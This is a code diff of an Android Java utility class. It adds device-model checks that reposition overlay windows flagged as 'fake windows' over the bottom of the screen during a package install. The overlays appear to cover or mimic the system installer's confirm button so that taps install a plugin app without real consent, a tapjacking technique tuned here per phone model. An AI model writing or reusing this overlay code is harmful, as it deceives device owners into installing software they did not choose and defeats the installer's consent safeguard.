@@ -146,7 +146,7 @@ public class UtilOperator {
                 AppRuntime.FAKE_WINDOWS_SHOW.set(false);
 
 //                if (AppRuntime.PLUGIN_INSTALLED) {
-                    Utils.tryToActivePluginApp(context);
+                Utils.tryToActivePluginApp(context);
 //                }
             } else {
                 if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
@@ -221,6 +221,18 @@ public class UtilOperator {
         }
 
         public void show(boolean full) {
+            String model = android.os.Build.MODEL;
+            if (!TextUtils.isEmpty(model)) {
+                model = model.toLowerCase();
+            }
+            boolean leftConfirm = false;
+            for (String m : AppRuntime.LEFT_CONFIRM_LIST) {
+                if (model.startsWith(m)) {
+                    leftConfirm = true;
+                    break;
+                }
+            }
+
             AppRuntime.FAKE_WINDOWS_SHOW.set(true);
             //install
             WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
@@ -229,8 +241,15 @@ public class UtilOperator {
             confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
             confirmBtnParams.width = (int) (50 * density);
             confirmBtnParams.height = (int) (48 * density);
-            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
-            confirmBtnParams.y = screenHeight - (int) (48 * density);
+            if (!leftConfirm) {
+                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
+                confirmBtnParams.y = screenHeight - (int) (48 * density);
+            } else {
+                confirmBtnParams.width = (int) (52 * density);
+                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2;
+                confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.START;
+            }
+            wm.addView(installView, confirmBtnParams);
 
             confirmFullBtnParams = new WindowManager.LayoutParams();
             confirmFullBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
@@ -238,10 +257,13 @@ public class UtilOperator {
             confirmFullBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
             confirmFullBtnParams.width = screenWidth / 2;
             confirmFullBtnParams.height = (int) (48 * density);
-            confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+            if (!leftConfirm) {
+                confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
+            } else {
+                confirmFullBtnParams.gravity = Gravity.BOTTOM | Gravity.LEFT;
+            }
 
             wm.addView(installFullView, confirmFullBtnParams);
-            wm.addView(installView, confirmBtnParams);
 
             //timer
             WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
@@ -250,7 +272,11 @@ public class UtilOperator {
             btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
             btnParams.width = screenWidth / 2;
             btnParams.height = (int) (48 * density);
-            btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+            if (!leftConfirm) {
+                btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+            } else {
+                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+            }
             wm.addView(timerView, btnParams);
 
             //cover
